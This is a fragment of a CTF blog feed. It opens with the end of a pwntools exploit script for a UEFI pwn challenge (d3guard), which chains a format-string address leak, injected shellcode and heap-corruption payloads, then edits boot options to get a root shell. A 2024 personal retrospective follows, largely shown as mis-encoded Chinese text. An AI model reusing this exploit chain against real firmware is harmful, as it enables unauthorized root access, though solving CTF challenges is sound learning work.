class="line">p.recvuntil(<span class="string">b&#x27;Username:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;User [&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">stack = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;.&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;.&quot;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;.&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">uiapp_base = leak - <span class="number">0x173f5</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;uiapp_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;Visitor): &quot;</span>, <span class="string">b&quot;1\r&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;Username: &quot;</span>, <span class="string">b&quot;Admin\r&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    jmp WIN;</span></span><br><span class="line"><span class="string">    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;</span></span><br><span class="line"><span class="string">    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;</span></span><br><span class="line"><span class="string">WIN:</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;uiapp_base + <span class="number">0xb982</span>&#125;</span>;</span></span><br><span class="line"><span class="string">    jmp rax;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;Pass key: &quot;</span>, shellcode+<span class="string">b&quot;\r&quot;</span>)</span><br><span class="line"></span><br><span class="line">role(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafafafafafaf</span>)*<span class="number">7</span> + p8(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafafafafafaf</span>)*<span class="number">6</span> + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">7</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafafafafafaf</span>)*<span class="number">6</span> + p32(<span class="number">0x30646870</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafaf6c617470</span>) + p8(<span class="number">0x60</span>) + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">6</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">ret = stack - <span class="number">0x104ba</span></span><br><span class="line">shellcode = ret - <span class="number">0x49</span></span><br><span class="line">lg(<span class="string">&quot;ret&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;shellcode&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\xef&#x27;</span>*<span class="number">0x78</span> + p32(ret)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;\xef&#x27;</span>*<span class="number">0x70</span> + p32(shellcode) + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">3</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;\xef&#x27;</span>*<span class="number">0x68</span> + p32(<span class="number">0x30726670</span>) + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">3</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafaf6c617470</span>) + p8(<span class="number">0x60</span>) + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">6</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">enterOS()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Press any key to continue...&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Standard PC&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\rrootshell\r&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\rconsole=ttyS0 initrd=rootfs.img rdinit=/bin/sh quiet\r&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;up&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;esc&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="å­¦ä¹ æ–‡ç« "><a href="#å­¦ä¹ æ–‡ç« " class="headerlink" title="å­¦ä¹ æ–‡ç« "></a>å­¦ä¹ æ–‡ç« </h2><p><a href="https://www.anquanke.com/post/id/283073">ä»ä¸€é“é¢˜å…¥é—¨ UEFI PWN</a><br><a href="https://github.com/yikesoftware/d3ctf-2022-pwn-d3guard">d3ctf-2022-pwn-d3guard</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç¥­ã€‘åœˆåœˆæ— ä¸ºçš„2024å¹´</title>
      <link href="/2024/12/31/2024/"/>
      <url>/2024/12/31/2024/</url>
      
        <content type="html"><![CDATA[<h2 id="æ‰¿æ¥2023"><a href="#æ‰¿æ¥2023" class="headerlink" title="æ‰¿æ¥2023"></a>æ‰¿æ¥2023</h2><p>è¿˜è®°å¾— 2023 å¹´ 12 æœˆ 31 å·çš„æ™šä¸Šï¼Œåœˆåœˆçœ‹ç€ pazuris åšå®¢ä¸Šçš„å¹´åº¦ç»ˆç»“ï¼ˆè¿™é‡Œæ‰“é”™å­—äº†ï¼Œpazuirs åŸè¯ï¼šâ€œæ‰å‘ç°å¹´åº¦ç»ˆç»“ï¼Œæˆ‘æè¿™å¼€å¤§æ‹›äº†æ˜¯å§ğŸ˜†â€ã€‚ç„¶ååœˆåœˆä¹Ÿä¸æƒ³æ”¹ğŸ¤”ï¼‰ï¼Œååœ¨æ¤…å­ä¸Šæ²‰é»˜äº†ä¸€ä¸ªå¤šå°æ—¶ã€‚æ˜¯çš„ï¼Œåœˆåœˆç ´é˜²äº†ï¼Œä»–è®¤ä¸ºè‡ªå·±çš„è¿™ä¸€å¹´ä¸€äº‹æ— æˆï¼Œç•™ä¸‹äº†è®¸å¤šçš„é—æ†¾ã€‚äºæ˜¯åœˆåœˆå½“æ—¶å°±ä¸‹å®šå†³å¿ƒï¼Œåœ¨æ–°çš„ä¸€å¹´é‡Œè¦æŒ–ç²ªæ¶‚å¢™ï¼Œå¼¥è¡¥ 2023 å¹´çš„é—æ†¾ï¼Œå¹¶å®ç°æ›´å¤šçš„ç›®æ ‡ã€‚  </p><h2 id="åœˆåœˆçš„2024"><a href="#åœˆåœˆçš„2024" class="headerlink" title="åœˆåœˆçš„2024"></a>åœˆåœˆçš„2024</h2><p>å½“æ—¶çš„åœˆåœˆæ˜¯ä¸€ä½å…¨èŒ CTF é€‰æ‰‹ï¼Œæ•´ä¸ªå¤§äºŒä¸Šå­¦æœŸéƒ½åœ¨çŒ›çŒ›çš„å­¦ pwnï¼Œå¯æ˜¯æ ¡é˜Ÿé‡Œé¢æ²¡æœ‰åˆ«çš„ pwn æ‰‹å’Œåœˆåœˆä¸€èµ·è®¨è®º pwn é¢˜ï¼Œè€Œä¸”èƒ½å’Œåœˆåœˆæ‰“æ¯ä¸€åœºæ¯”èµ›çš„ä¹Ÿå°±åªæœ‰ panz0e å¸ˆå‚…ï¼ˆçœŸçš„éå¸¸æ„Ÿè°¢ä»–&#x2F;(ã„’oã„’)&#x2F;~~ï¼‰ï¼Œæ²¡æœ‰ä¸€åœºæ¯”èµ›èƒ½å¤Ÿæ‰“è¿›çº¿ä¸‹ï¼Œå½“æ—¶çš„åœˆåœˆååˆ†æ¸´æœ›èƒ½å¤Ÿæ‰“è¿›çº¿ä¸‹èµ›ï¼Œå¯æ˜¯åƒä»€ä¹ˆé¦™å±±æ¯ä»€ä¹ˆå¼ºç½‘æ¯éƒ½åªå·®ä¸€é“é¢˜ï¼Œå¿ƒæ€ç›´æ¥å´©æºƒäº†ã€‚åœˆåœˆå¾ˆæ—©å°±çŸ¥é“æœ‰è”åˆæˆ˜é˜Ÿè¿™ä¸ªä¸œè¥¿(åœˆåœˆè¿™ä¸ªæ—¶å€™å¯¹è”åˆæˆ˜é˜Ÿå……æ»¡ç€æ•¬ç•ä¹‹å¿ƒï¼Œè§‰å¾—è”åˆæˆ˜é˜Ÿæ˜¯ä¸€ä¸ªç”±ä¸€å †é¡¶çº§çš„å¸ˆå‚…è”åˆèµ·æ¥çš„åœ°æ–¹)ï¼Œçœ‹åˆ° pazuris çš„åšå®¢é‡Œæœ‰æåˆ° V&amp;N æˆ˜é˜Ÿï¼Œäºæ˜¯ 23 å¹´ 12 æœˆ 31 å·å°±åŠ äº† pazuris çš„å¥½å‹å¹¶è¯¢é—®å¦‚ä½•åŠ å…¥ï¼Œç„¶åæˆ‘å°±åŠ ä¸Šäº†å½“æ—¶ V&amp;N çš„é˜Ÿé•¿ eeee å¸ˆå‚…ã€‚å½“æ—¶è¿˜æ˜¯å¾ˆå…´å¥‹äº†ï¼Œè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡èƒ½å¤Ÿå’Œé™¤æ ¡é˜Ÿä»¥å¤–çš„ pwn å¸ˆå‚…äº¤æµï¼Œäºæ˜¯å’Œ eeee èŠäº†å¾ˆå¤šï¼ŒåŒ…æ‹¬å †åˆ©ç”¨çš„å„ç§ house ä»€ä¹ˆä»€ä¹ˆçš„ï¼Œä¹Ÿäº†è§£åˆ° eeee å¸ˆå‚…åˆšè€ƒå®Œç ”ã€‚<br>é¢è¯•æ—¶é—´å¾ˆå¿«å°±å®šä¸‹æ¥äº†ï¼Œä¸è¿‡ç”±äº V&amp;N çš„å¸ˆå‚…ä»¬è¦å‚åŠ æœŸæœ«è€ƒè¯•ï¼Œäºæ˜¯å°±æ‰¾äº† W&amp;M çš„ wjh å’Œ cnitlrt å¸ˆå‚…æ¥é¢æˆ‘ã€‚å½“æ—¶çŸ¥é“è¿™ä¸ªæ¶ˆæ¯åä¹ŸæŒºéš¾å´©çš„ï¼ˆä»€ä¹ˆï¼Ÿæˆ‘æ‰“å®¿å‚©ï¼Ÿï¼‰ï¼Œæ„Ÿè§‰è¦ gg äº†ï¼Œä¸è¿‡å¥½åœ¨é¢è¯•çš„æ—¶å€™å„ç§å †æ ˆåˆ©ç”¨å…¨éƒ½å›ç­”å‡ºæ¥äº†ï¼Œæœ€å cnitlrt é—®äº†æˆ‘ä¸€ä¸ª io uringã€‚è¿™ç©æ„å½“æ—¶è¿˜ä¸æ€ä¹ˆæµè¡Œæ‰€ä»¥æ²¡å›ç­”å‡ºæ¥ï¼Œä¸è¿‡æœ€åè¿˜æ˜¯â€œæœ‰æƒŠæœ‰é™©â€çš„åŠ å…¥äº† V&amp;Nã€‚ </p><p>æœŸæœ«è€ƒå®Œå nssctf å°±å¼€äº†ï¼Œå½“æ—¶å’Œ pazuris å’Œ unknown ç»„äº†ä¸ªé˜Ÿå»ç©ï¼Œç»“æœé¢˜ç›®å¼‚å¸¸ç®€å•ï¼Œå·®ä¸€é¢˜ re å°± ak äº†ï¼ˆåœˆåœˆæ²¡åšå‡ºæ¥é‚£é¢˜ C# é€†å‘ğŸ˜‡ï¼‰  </p><img src="/2024/12/31/2024/44.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"> <p>åŠ å…¥ V&amp;N åçš„ç¬¬ä¸€åœºå’Œä»–ä»¬æ‰“çš„æ¯”èµ›æ˜¯ xctf åˆ†ç«™èµ› l3hctfï¼Œå½“æ—¶çš„ V&amp;N å¥½åƒæ²¡ä»€ä¹ˆäººæ‰“ï¼Œè€Œä¸”å’Œæ•°æ¨¡ç¾èµ›å†²çªäº†ï¼Œåœˆåœˆæ‰“äº† 2 crypto 2 miscï¼Œpwnï¼Ÿä¸ä¼šåšï¼Œå’Œ korey0sh1 å¸ˆå‚…æƒ³äº†åŠå¤©å‘ç°ç»™ xtx å¸ˆå‚…åšå‡ºæ¥äº†ã€‚è¿˜è®°å¾—æœ‰é¢˜å¯†ç ï¼Œåœˆåœˆæ‰‹åŠ¨å°†å…¶å¯†é’¥åˆ†æˆäº† 16 ä¸ªèŒƒå›´ç„¶åç¡¬çˆ†ç ´ï¼Œå’Œ panz0e å¸ˆå‚…æåˆ°å‡Œæ™¨ 5 ç‚¹æ‰çˆ†ç ´å‡ºæ¥ã€‚  </p><img src="/2024/12/31/2024/43.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æ¥ä¸‹æ¥å°±æ˜¯ V&amp;N newbe çš„ç»„å»ºé˜¶æ®µï¼Œunknown å¸ˆå‚…å½“ä¸Šäº† V&amp;N çš„æ–°ä¸€ä»»é˜Ÿé•¿ï¼Œç„¶å VNCTF2024 ä¹Ÿåœ¨é‚£ä¸ªæ—¶å€™ä¸¾è¡Œã€‚è¿™æ˜¯åœˆåœˆç¬¬ä¸€æ¬¡åœ¨å¤–é¢çš„æ¯”èµ›å‡ºé¢˜ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡åœ¨å¤–é¢æ‹‰å±ã€‚åªèƒ½è¯´å‡ºäº†é¢˜é€†å‘é¢˜è€Œä¸æ˜¯ pwnï¼Œå®Œå…¨æ²¡æœ‰ä»€ä¹ˆæŠ€æœ¯å«é‡ï¼ˆé¢˜ç›®åå­—æ˜¯shellshockï¼Œç°åœ¨æƒ³éª‚æˆ‘è¿˜æ¥å¾—åŠğŸ˜€ï¼‰ã€‚ä¸è¿‡æ²¡æƒ³åˆ°è¿˜ä¼šæœ‰äººåšå‡ºæ¥äº†ï¼Œè¿˜æ˜¯éé¢„æœŸï¼ˆenllusion å¸ˆå‚…å¤ªå¼ºäº†ï¼‰ã€‚VNCTF ç»“æŸåå°±å¼€å§‹ V&amp;N çš„æ‹›äººé˜¶æ®µï¼Œåœˆåœˆä¹Ÿé˜´é˜³äº¤é”™çš„åŠ å…¥åˆ°äº†æ‹›äººç»„ï¼Œä¸æ–­çš„å’Œé—®å·ä¸­çš„å„ä¸ªå¸ˆå‚…è”ç³»ç„¶åå®‰æ’é¢è¯•æ—¶é—´ä»€ä¹ˆçš„ï¼ˆæ²¡æœ‰ä¸€ä¸ª pwnï¼‰ã€‚å¯æ˜¯è¿™ä¸ªæ—¶å€™åœˆåœˆçªç„¶å¾—äº†è¶…çº§ä¸¥é‡çš„æ€¥æ€§è‚ èƒƒç‚ï¼Œä¸‹åŠèº«ç›´æ¥å¤±å»çš„ç›´è§‰ï¼Œæœ€ååœ¨å®¶äººçš„å¸®åŠ©å’Œåœ¨åŒ»é™¢æ‰“äº†ä¸¤ä¸ªåŠé’ˆä¹‹åæŒºäº†è¿‡æ¥ã€‚è¿™ä¹Ÿæ˜¯åœˆåœˆç¬¬ä¸€æ¬¡äº§ç”Ÿäº†å¯¹ * * çš„ææƒ§ï¼Œä¹Ÿåšå®šäº†åœˆåœˆè¦æ‰“é€ ä¸€å‰¯å¥½èº«ä½“çš„å†³å¿ƒã€‚æ‰€ä»¥å¼€å­¦ååœˆåœˆåªè¦æœ‰ç©ºå°±ä¼šå»è·‘æ­¥ï¼Œä¸€å¼€å§‹æ˜¯å’Œå¦å¤–ä¸€ä½åŒå­¦ä¸€èµ·å»è·‘çš„ï¼Œåé¢å‘ç°è¿™æ ·å­ä¸å¤ªæ–¹ä¾¿ï¼Œå°±å˜æˆä¸€ä¸ªäººè·‘äº†ã€‚é€æ¸çš„ï¼Œåœˆåœˆçˆ±ä¸Šäº†è·‘æ­¥ï¼Œè·‘æ­¥ä¼šä¸Šç˜¾ï¼ï¼  </p><p>unknown å¸ˆå‚…ä¹Ÿå–œæ¬¢è·‘æ­¥ï¼Œè€Œä¸”éå¸¸å‰å®³ï¼Œç»å¸¸çœ‹ä»–è·‘ 10 å…¬é‡Œï¼Œå¤ª new æ‹‰ï¼  </p><p>å¦‚æœè¯´å¤§äºŒä¸Šæ˜¯åœˆåœˆå­¦ pwn çš„ä¸€ä¸ªå­¦æœŸï¼Œé‚£ä¹ˆå¤§äºŒä¸‹å°±æ˜¯åœˆåœˆè½¬å‹çš„ä¸€ä¸ªå­¦æœŸã€‚Bç«™å¹´åº¦æ€»ç»“ä¸ºè¯ğŸ¤£</p><img src="/2024/12/31/2024/38.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>GZï¼šâ€œé»‘é©¬çš„è§†é¢‘ä½ çœ‹çš„ä¸‹å»çš„ï¼Ÿ40hâ€<br>åœˆåœˆï¼šâ€œå½“ç„¶çœ‹ä¸ä¸‹å»ï¼Œè¦æ˜¯çœ‹å¾—ä¸‹å»å°±ä¸æ­¢ 40h äº†ğŸ˜‡â€  </p><p>ç”±äºåœˆåœˆæ˜¯ä»å¤§ä¸€çš„æš‘å‡æ‰å¼€å§‹å­¦ pwn çš„ï¼Œä¸ºäº†èµ¶ä¸Šåˆ«äººçš„è¿›åº¦ï¼Œæ•´ä¸ªå¤§äºŒä¸Šæ¯å¤©éƒ½æœ€å°‘åˆ†é…äº”ä¸ªå°æ—¶åœ¨å­¦ä¹  pwnï¼Œå¯æ˜¯ä¸€ä¸ªå­¦æœŸä¸‹æ¥åœˆåœˆæ„Ÿè§‰è‡ªå·±éƒ½è¦å˜æˆåšé¢˜å®¶äº†ï¼Œé™¤äº†åšé¢˜è¿˜æ˜¯åšé¢˜ï¼Œäºæ˜¯åœˆåœˆäº§ç”Ÿäº†å­¦ä¹ åˆ«çš„é¢†åŸŸçš„çŸ¥è¯†çš„æƒ³æ³•ã€‚å½“ç„¶ï¼Œèƒ½æƒ³åˆ°çš„ç¬¬ä¸€ä»¶äº‹æƒ…å°±æ˜¯ JAVA åç«¯å¼€å‘ï¼Œäºæ˜¯åœˆåœˆå°±æŠŠé»‘é©¬çš„ JAVA WEB ç»™åˆ·äº†ä¸€éã€‚  </p><img src="/2024/12/31/2024/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>åŒæ—¶ç”±äºå¤§äºŒä¸‹å­¦æœŸçš„ç¼–è¯‘åŸç†å®éªŒå…¨éƒ½è¦æ±‚è¦å¯è§†åŒ–ï¼Œæ‰€ä»¥åœˆåœˆåˆæŠŠBç«™ä¸Šçš„ Qt å…¥é—¨è§†é¢‘ä¹Ÿåˆ·äº†ä¸€éâ€¦â€¦  </p><img src="/2024/12/31/2024/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>åé¢å‘ç°ä¸“é—¨å»å­¦ Qt æ€ä¹ˆä½¿ç”¨æœ‰ç‚¹æµªè´¹æ—¶é—´äº†ï¼Œå› ä¸ºæœ€ååœ¨åšç¼–è¯‘åŸç†å®éªŒçš„æ—¶å€™å¯è§†åŒ–é‚£éƒ¨åˆ†æ ¹æœ¬ä¸éœ€è¦ä½¿ç”¨ä»€ä¹ˆé«˜çº§çš„è¯­æ³•ï¼Œç›´æ¥æŠŠè¦æ±‚å–‚ç»™ GPT å°±æå®šäº†ï¼Œæ— è¯­å­ã€‚<br>å­¦å®Œé»‘é©¬çš„ JAVA WEB ååœˆåœˆæ„Ÿè§‰è¦æ‰¾æ‰¾é¡¹ç›®ç»ƒç»ƒæ‰‹ï¼Œç”±äºå­¦é™¢çš„é¡¹ç›®å…¨éƒ½æ˜¯å’Œ ai æœ‰å…³çš„ï¼Œåœˆåœˆä¸æ˜¯å¾ˆæ‡‚ï¼Œæ‰€ä»¥åªèƒ½è‡ªå·±æ‰¾é¡¹ç›®å†™å†™ï¼Œæ‰¾çš„è¿˜æ˜¯é»‘é©¬ä¸Šé¢ â€œ**å¤–å–â€ï¼Œè·Ÿç€æ•²äº†ä¸€åŠï¼Œæ„Ÿè§‰è¿™ç©æ„å®Œå…¨å°±æ˜¯æŠ„ä½œä¸šï¼Œæ‰€ä»¥åé¢ä¹Ÿæ²¡è·Ÿç€åšä¸‹å»äº†ã€‚åˆšå¥½æœŸæœ«è½¯ä»¶å·¥ç¨‹ä¹Ÿè¦äº¤ä¸€ä¸ªé¡¹ç›®ï¼Œæ‰€ä»¥åœˆåœˆå°±å’Œå®¤å‹ç»„é˜Ÿè´Ÿè´£é¡¹ç›®çš„åç«¯éƒ¨åˆ†ï¼Œæœ€åä¸€é¡¿æ“ä½œä¸‹æ¥ä¸€å † bugï¼Œè¿˜å¥½æ–‡æ¡£å†™çš„å¥½çœ‹ï¼Œæœ€åæœŸæœ«å’Œå¹³æ—¶åˆ†éƒ½ç»™äº†åœˆåœˆ 90 å¤šåˆ†ï¼ˆç¬‘  </p><p>åœˆåœˆå­¦è¿‡ä¸€æ®µæ—¶é—´ aiï¼Œä¹°äº†æœ¬è¥¿ç“œä¹¦å•ƒäº†ä¸€ä¸ªæ˜ŸæœŸï¼Œå‘ç°çœ‹ä¸æ‡‚ã€‚æä¸æ‡‚åŸç†å­¦åº”ç”¨æ€»è¡Œäº†æŠŠï¼Œäºæ˜¯åœˆåœˆåˆä¹°äº†æœ¬ã€Špythonæœºå™¨å­¦ä¹ åŸºç¡€æ•™ç¨‹ã€‹ã€‚çœ‹äº†åŠå¤©æ„Ÿè§‰å’Œåœˆåœˆå¹³æ—¶æ‰“æ•°æ¨¡æ¯”èµ›çš„ä¸œè¥¿å·®ä¸å¤šï¼Œç„¶åå°±æ²¡ç»§ç»­çœ‹ä¸‹å»äº†ã€‚  </p><p>è¿™å­¦æœŸåœˆåœˆä¹Ÿå­¦äº†æŒºé•¿æ—¶é—´çš„æ¸—é€ï¼Œé¦–å…ˆæ˜¯æŠŠ N1 é‚£è¾¹å†…ç½‘æ¸—é€ä½“ç³»å»ºè®¾é™¤æœ€å 2 ç« å¤–çš„å†…å®¹å…¨åˆ·äº†ä¸€æ ·å§ã€‚åˆ«è¯´ï¼Œåœˆåœˆå­¦çš„å¯è®¤çœŸäº†ï¼Œç”šè‡³æ¯ä¸€é¡µéƒ½æœ‰ç¬”è®°ï¼ˆç°åœ¨å›æƒ³èµ·æ¥å°±æƒ³ç¬‘ï¼‰ã€‚ç„¶åæ›´ç€Bç«™çš„çº¢é˜Ÿç¬”è®°å»æ‰“ vulnhub çš„ç®€å•é¶æœºï¼Œåé¢å‘ç° pwn æ‰‹ä¸å¤ªé€‚åˆæè¿™ç©æ„ï¼Œå°±æ²¡å†ç»§ç»­æä¸‹å»äº†ã€‚  </p><p>å¥½ï¼Œå†å›åˆ° V&amp;Nï¼ŒVNnewbe ç»„å»ºåå¾ˆå¿«å°±è¿æ¥äº† XCTF æœ€åä¸€åœºåˆ†ç«™èµ› DubheCTFï¼ŒV&amp;N èƒ½ä¸èƒ½è¿› final å°±çœ‹è¿™ä¸€åœºäº†ã€‚ç”±äºåœˆåœˆæ˜¯åœ¨ VNnewbe åˆ›å»ºå‰åŠ çš„ VNï¼Œæ‰€ä»¥ newbe é‡Œå¾ˆå¤šå¸ˆå‚…éƒ½ä»¥ä¸ºåœˆåœˆçš„è€ç™»ï¼Œç‰¹åˆ«æ˜¯ pwn æ–¹å‘ï¼Œå¯¼è‡´åœˆåœˆ DubheCTF å‹åŠ›æ‹‰æ»¡ã€‚æ¯”èµ›ä¸€å¼€å§‹ï¼Œæ‰“å¼€ pwnï¼Œä¸€é¢˜æ˜¯ UEFI SSMï¼Œå¦å¤–ä¸€é¢˜æ˜¯ä»£ç é‡å¤šåˆ°çˆ†ç‚¸çš„ golang åè®® pwnï¼Œåœˆåœˆå½“æ—¶ç›´æ¥æ²¡çœ¼çœ‹äº†ã€‚</p><p>ä¸­é—´æ‰“åˆ°ç ´é˜²äº†å»æ—è¾¹çš„ VCTF æ‘¸äº†ä¸€ä¸‹é±¼ï¼Œä¸å°å¿ƒæ‹¿äº†ä¸ª pwn æ–¹å‘ç¬¬ä¸€ :)  </p><img src="/2024/12/31/2024/45.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>äº‹å®è¯æ˜ï¼Œäººåœ¨å‹åŠ›å¤§çš„æ—¶å€™ä¼šçªç ´æé™ï¼Œé‚£åœºæ¯”èµ›åœˆåœˆå’Œ xtx å¸ˆå‚…åˆä½œåšå‡ºæ¥äº† golang pwnï¼Œæ‰‹å¿«æ‹¿äº†ç­¾åˆ° pyjail äºŒè¡€ï¼Œä¸€ä¸ªäººåšå‡ºæ¥äº†ä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰å †ç®¡ç†ç³»ç»Ÿçš„ pwnã€‚é—æ†¾çš„æ˜¯ V&amp;N å·®ä¸€åè¿›å†³èµ›ï¼Œå¿ƒæ€æœ‰ç‚¹å°å´©ï¼Œåœˆåœˆåœ¨ CTF ä¸Šæœ€ç»ˆçš„æ¢¦æƒ³å°±æ˜¯å‚ä¸ä¸€æ¬¡ XCTF finalã€‚åé¢å’Œ V&amp;N çš„æ¯”èµ›å¥½åƒå°±æ²¡ä»€ä¹ˆç‰¹åˆ«çš„äº†ï¼Œåœˆåœˆåªè¦æœ‰ç©ºå°±ä¼šå»å‚åŠ ï¼Œç„¶ååˆ’æ°´æ‘¸é±¼æ‘¸ä¸ª 2ã€3 é¢˜ pwnï¼Œæœ‰æ—¶è¿æ°”å¥½å‡ºä¸€äº›ç®€å•çš„å¯†ç å’Œé€†å‘ã€‚  </p><p>å¤§äºŒä¸Šä¹Ÿè¿æ¥äº†åœˆåœˆç¬¬ä¸€åœºçº¿ä¸‹èµ›ï¼Œå¹¿ä¸œçœçœèµ›ï¼Œä¸è¿‡è¿™ä¸ªæ¯”èµ›å¤ªå¤šåæ§½ç‚¹äº†ã€‚è¿™é‡Œä¸å¤šè¯´ï¼Œç›´æ¥ä¸Šå›¾ï¼š  </p><img src="/2024/12/31/2024/4.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¥½ï¼Œéª‚çˆ½äº†ï¼Œä¸è¿‡æ¯”èµ›è¿˜æ˜¯è¦å‚åŠ ã€‚å¯æ˜¯è°åˆèƒ½æƒ³åˆ° 3 pwn 1 web ç»„æˆçš„é˜Ÿå»æ‰“ä¸€åœºåªæœ‰ web çš„ awdp èƒ½æ‹¿åˆ°ä¸€ç­‰å¥–å‘¢ï¼ŸğŸ˜‚  </p><img src="/2024/12/31/2024/5.jpg" class="" 